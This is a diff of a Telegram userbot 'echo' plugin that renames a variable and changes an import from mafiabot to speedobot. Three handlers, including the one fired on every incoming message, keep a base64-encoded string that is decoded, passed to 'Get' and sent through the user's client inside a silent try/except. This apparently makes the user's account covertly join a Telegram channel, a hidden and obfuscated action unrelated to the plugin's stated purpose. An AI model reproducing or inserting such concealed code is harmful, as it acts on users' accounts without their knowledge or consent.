@@ -16,62 +16,62 @@ from userbot.plugins.sql_helper.echo_sql import (
     is_echo,
     remove_echo,
 )
-from mafiabot.utils import admin_cmd, edit_or_reply, sudo_cmd
+from speedobot.utils import admin_cmd, edit_or_reply, sudo_cmd
 from userbot.cmdhelp import CmdHelp
 
 
 @bot.on(admin_cmd(pattern="echo$"))
 @bot.on(sudo_cmd(pattern="echo$", allow_sudo=True))
-async def echo(mafia):
-    if mafia.fwd_from:
+async def echo(speedo):
+    if speedo.fwd_from:
         return
-    if mafia.reply_to_msg_id is not None:
-        reply_msg = await mafia.get_reply_message()
+    if speedo.reply_to_msg_id is not None:
+        reply_msg = await speedo.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = mafia.chat_id
+        chat_id = speedo.chat_id
         try:
             h1m4n5hu0p = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             h1m4n5hu0p = Get(h1m4n5hu0p)
-            await mafia.client(h1m4n5hu0p)
+            await speedo.client(h1m4n5hu0p)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
-            await edit_or_reply(mafia, "The user is already enabled with echo ")
+            await edit_or_reply(speedo, "The user is already enabled with echo ")
             return
         addecho(user_id, chat_id)
-        await edit_or_reply(mafia, "Hii....😄🤓")
+        await edit_or_reply(speedo, "Hii....😄🤓")
     else:
-        await edit_or_reply(mafia, "Reply to a User's message to echo his messages")
+        await edit_or_reply(speedo, "Reply to a User's message to echo his messages")
 
 
 @bot.on(admin_cmd(pattern="rmecho$"))
 @bot.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
-async def echo(mafia):
-    if mafia.fwd_from:
+async def echo(speedo):
+    if speedo.fwd_from:
         return
-    if mafia.reply_to_msg_id is not None:
-        reply_msg = await mafia.get_reply_message()
+    if speedo.reply_to_msg_id is not None:
+        reply_msg = await speedo.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = mafia.chat_id
+        chat_id = speedo.chat_id
         try:
             h1m4n5hu0p = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             h1m4n5hu0p = Get(h1m4n5hu0p)
-            await mafia.client(h1m4n5hu0p)
+            await speedo.client(h1m4n5hu0p)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
             remove_echo(user_id, chat_id)
-            await edit_or_reply(mafia, "Echo has been stopped for the user")
+            await edit_or_reply(speedo, "Echo has been stopped for the user")
         else:
-            await edit_or_reply(mafia, "The user is not activated with echo")
+            await edit_or_reply(speedo, "The user is not activated with echo")
     else:
-        await edit_or_reply(mafia, "Reply to a User's message to echo his messages")
+        await edit_or_reply(speedo, "Reply to a User's message to echo his messages")
 
 
 @bot.on(admin_cmd(pattern="listecho$"))
 @bot.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
-async def echo(mafia):
-    if mafia.fwd_from:
+async def echo(speedo):
+    if speedo.fwd_from:
         return
     lsts = get_all_echos()
     if len(lsts) > 0:
@@ -93,25 +93,25 @@ async def echo(mafia):
         )
         url = f"https://nekobin.com/{key}"
         reply_text = f"echo enabled users: [here]({url})"
-        await edit_or_reply(mafia, reply_text)
+        await edit_or_reply(speedo, reply_text)
     else:
-        await edit_or_reply(mafia, output_str)
+        await edit_or_reply(speedo, output_str)
 
 
 @bot.on(events.NewMessage(incoming=True))
-async def samereply(mafia):
-    if mafia.chat_id in Config.UB_BLACK_LIST_CHAT:
+async def samereply(speedo):
+    if speedo.chat_id in Config.UB_BLACK_LIST_CHAT:
         return
-    if is_echo(mafia.sender_id, mafia.chat_id):
+    if is_echo(speedo.sender_id, speedo.chat_id):
         await asyncio.sleep(2)
         try:
             h1m4n5hu0p = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             h1m4n5hu0p = Get(h1m4n5hu0p)
-            await mafia.client(h1m4n5hu0p)
+            await speedo.client(h1m4n5hu0p)
         except BaseException:
             pass
-        if mafia.message.text or mafia.message.sticker:
-            await mafia.reply(mafia.message)
+        if speedo.message.text or speedo.message.sticker:
+            await speedo.reply(speedo.message)
 
 
 CmdHelp("echo").add_command(
